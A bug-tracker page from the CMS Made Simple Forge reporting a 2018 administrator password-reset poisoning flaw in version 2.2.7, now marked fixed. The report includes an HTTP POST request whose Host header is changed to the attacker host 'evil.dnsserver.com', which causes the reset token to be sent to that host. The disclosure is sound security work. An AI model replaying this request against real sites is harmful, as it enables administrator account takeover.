=== Content from dev.cmsmadesimple.org_6d44b045_20250125_002641.html ===


# [CMSMS | CMS Made Simple](http://www.cmsmadesimple.org/)

* [1: Home](http://www.cmsmadesimple.org/ "Home Page, shortcut key=1")
* [2: About](http://www.cmsmadesimple.org/about-link)
  + [2.1: About Us](http://www.cmsmadesimple.org/about-link/about-us)
  + [2.2: CMS Made Simple Demo](https://softaculous.com/demos/cms_made_simple)
  + [2.3: Testimonials](http://www.cmsmadesimple.org/about-link/testimonials)
  + [2.5: Donations](http://www.cmsmadesimple.org/about-link/donations)
  + [2.7: About This Website](http://www.cmsmadesimple.org/about-link/about-this-website)
* [3: Downloads](http://www.cmsmadesimple.org/downloads)
  + [3.1: File Releases](http://dev.cmsmadesimple.org/project/files/6#package-1)
  + [3.3: CMSms Themes Site](http://themes.cmsmadesimple.org/ "CMSms Themes Site")
  + [3.4: Modules](http://dev.cmsmadesimple.org/project/list/module "Get add-on modules to expand functionality here")
  + [3.5: Tags](http://dev.cmsmadesimple.org/project/list/plugin "Get Plugins/tags here")
* [5: Support](https://www.cmsmadesimple.org/support/options)
  + [5.1: Documentation](http://docs.cmsmadesimple.org/)
  + [5.2: FAQ](http://www.cmsmadesimple.org/support/faq)
  + [5.3: Blog](http://www.cmsmadesimple.org/about-link/blog/)
  + [5.4: Slack](https://www.cmsmadesimple.org/support/documentation/chat)
  + [5.5: Participate](https://www.cmsmadesimple.org/community/get-involved/get-involved-overview)
  + [5.6: Report Bug or Feature Request](http://dev.cmsmadesimple.org/bug/list/6)
  + [5.7: Newsletter](https://www.cmsmadesimple.org/community/newsletter)
  + [5.9: CMS Made Simple Hosting](https://www.cmsmadesimple.org/partners)
  + [5.10: Professional Services](https://www.cmsmadesimple.org/support/hire-a-dev)
* [6: Forum](http://forum.cmsmadesimple.org/)
  + [6.1: Rules](http://forum.cmsmadesimple.org/index.php/board%2C40.0.html)
  + [6.2: Announcements](http://forum.cmsmadesimple.org/index.php/board%2C1.0.html)
* [7: Development](http://dev.cmsmadesimple.org/)
  + [7.1: Roadmap](http://www.cmsmadesimple.org/development/roadmap)
  + [7.3: CMSMS Forge](http://dev.cmsmadesimple.org/)
  + [7.5: Translationcenter](http://translations.cmsmadesimple.org/ "Link to TranslationCenter site")

## CMS MADE SIMPLE FORGE

# CMS Made Simple Core

* [Summary](/projects/cmsmadesimple)
* [Files](/project/files/6)
* [Bug Tracker](/bug/list/6)
* [Feature Requests](/feature_request/list/6)
* [Code](/project/code/6)

* [Forge Home](/)
* [Project List](/project/list)
* [Recent Changes](/recent_changes.html "Recent Changes")

* [![Login](/images/icons/users.gif "Login")](/users)
  [Login](/users)

[![Back](/images/icons/back.gif "Back") Back to List](/bug/list/6)
## [#11762] Administrator Password Reset Poisoning by host header attack

![avatar](http://www.gravatar.com/avatar.php?gravatar_id=bb7d0869c98f0037e46e33f5bf5c4cd8&rating=PG&size=50)

Created By:
reklawetihwx ([reklawetihwx](/users/reklawetihwx))

Date Submitted:
Sat Mar 03 05:58:34 -0500 2018

Assigned To:

Version:
None

CMSMS Version:
2.2.7

Severity:
Minor

Resolution:
Fixed

State:
Closed

Summary:
Administrator Password Reset Poisoning by host header attack

Detailed Description:
```
the forget password function only needs the user name to generate the reset
password link to the user'email.The following POST request is the normal
request.

POST /admin/login.php HTTP/1.1
Host: Host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/admin/login.php?forgotpw=1
Cookie: [removed]
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

forgottenusername=admin&forgotpwform=1&loginsubmit=Submit

This is the a normal reset password link:

http://Host/admin/login.php?recoverme=b18c6cc54432d97a1a7f28c6103b5b58

But the reset password link's host is come from the forget password POST
request. It means that if we change the host header of the request, the reset
password link's host will be change.

so if the attacker konws the administrator'name and change the change the host
header of the request. when the admin click the link, the attacker will be know
the token of recoverme. For example:
1. the attcker change the host header of the request to his dns server which is
evil.dnsserver.com

POST /admin/login.php HTTP/1.1
Host: evil.dnsserver.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost/admin/login.php?forgotpw=1
Cookie: [removed]
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

forgottenusername=admin&forgotpwform=1&loginsubmit=Submit

2. then the admin will receive the password reset link as follow:

http://evil.dnsserver.com/admin/login.php?recoverme=b18c6cc54432d97a1a7f28c6103b5b58

3. when the admin click the reset password link, the attacker will receive the
request from the admin, and the attacker will get the value of recoverme. Then
the attacker can make up a true reset password link with the true host and can
change the admin's password
```

## History

Comments
![avatar](http://www.gravatar.com/avatar.php?gravatar_id=bb7d0869c98f0037e46e33f5bf5c4cd8&rating=PG&size=50)

```

Date: 2018-03-14 03:08
Posted By: reklawetihwx ([reklawetihwx](/users/reklawetihwx))

Any news about this ?

```

Updates

Updated: 2018-08-25 10:26

state: Open => Closed

Updated: 2018-07-14 18:32

resolution\_id: 5 => 7

Updated: 2018-03-25 07:34

resolution\_id: => 5

cmsms\_version\_id: 31359 => 31369

* [1: Home](http://www.cmsmadesimple.org/ "Home Page, shortcut key=1")
* [2: About](http://www.cmsmadesimple.org/about-link)
* [3: Downloads](http://www.cmsmadesimple.org/downloads)
* [5: Support](http://www.cmsmadesimple.org/support)
* [6: Forum](http://forum.cmsmadesimple.org/)
* [7: Development](http://dev.cmsmadesimple.org/)

CMS made simple is Free software under the GNU/GPL licence.

Website designed by [Steve Sicherman](http://stevesicherman.com/)

![Spinner](/images/spinner.gif?1174174309)


